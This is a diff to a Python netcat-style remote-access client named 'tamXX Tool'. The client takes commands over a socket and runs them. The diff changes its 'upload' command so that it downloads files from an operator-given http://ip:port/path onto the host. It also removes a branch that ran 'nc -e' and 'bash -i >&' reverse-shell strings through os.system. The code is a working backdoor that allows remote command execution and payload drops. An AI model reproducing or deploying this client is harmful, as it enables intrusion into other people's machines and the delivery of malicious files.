@@ -2,6 +2,7 @@
 import socket
 import sys, os, time
 import subprocess
+import urllib.request
 
 class netcatCli(object):
     clientHandler = False
@@ -15,9 +16,9 @@ class netcatCli(object):
         print("""
         tamXX Tool :\n
         [OPTIONS] :
-        \t\t--target [IP]\t\t\t-     target
+        \t\t-T , --target [IP]\t\t\t-     target
         \t\t-p , --port [PORT]\t\t\t-     port
-        \t\t--prompt\t\t\t-     initialize prompt
+        \t\t-P , --prompt\t\t\t-     initialize prompt
         \t\t-h , --help\t\t\t-     get some help ;)
         """)
         sys.exit()
@@ -85,15 +86,13 @@ class netcatCli(object):
                 s.send(output.encode())
             elif "upload" in recv:
                 recv = recv.split(' ')[1:]
-                filesize = recv[0]
-                filename = recv[1]
-                print(filename)
+                filename = recv[0]
+                ip = recv[1]
+                src = recv[2]
+                port = recv[3]
                 if ";" in filename:
                     filename = filename.replace(";",'.')
-                self.download(s,filename,filesize)
-            elif 'nc -e' in recv or 'bash -i >&' in recv:
-                os.system(recv)
-                s.send(b"\n[*] OPEN NEW SHELL\n")
+                self.download(s,filename,ip,src,port)
             else:
 
                 output = recv+'\n\n'
@@ -104,15 +103,10 @@ class netcatCli(object):
                 #s.send(CMD.stdout.read())
                 #s.send(CMD.stderr.read())
 
-    def download(self,conn,dest,size):
-        bufferSize = 2**18
+    def download(self,conn,dest,ip,src,port):
         try:
-            f=open(dest,"w",encoding="utf-8")
-            data = conn.recv(int(size)).decode()
-            print(data)
-            f.write(data)
-            conn.send(b"UPLOADED COMPLETE")
-            f.close()
+            url = "http://%s:%s/%s"%(ip,port,src)
+            urllib.request.urlretrieve(url, dest)
         except PermissionError:
             conn.send(b"you can\'t upload here ! ")
 if __name__ == "__main__":
